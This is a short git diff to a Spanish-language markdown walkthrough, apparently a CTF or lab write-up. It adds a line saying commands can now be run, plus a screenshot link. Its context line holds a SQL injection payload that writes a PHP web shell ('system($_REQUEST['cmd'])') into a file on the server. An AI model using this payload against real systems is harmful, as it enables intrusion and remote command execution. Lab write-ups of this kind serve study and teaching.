@@ -135,6 +135,11 @@ union select 1,2,"<?php system($_REQUEST['cmd']); ?>",4,5,6,7 into outfile "/var
 ```
 ![Resultado de Nmap](IMG/reverse.png)
 
+Y ahora podemos ejecutar comandos
+
+![Resultado de Nmap](IMG/reverse1.png)
+
+
 
 
 
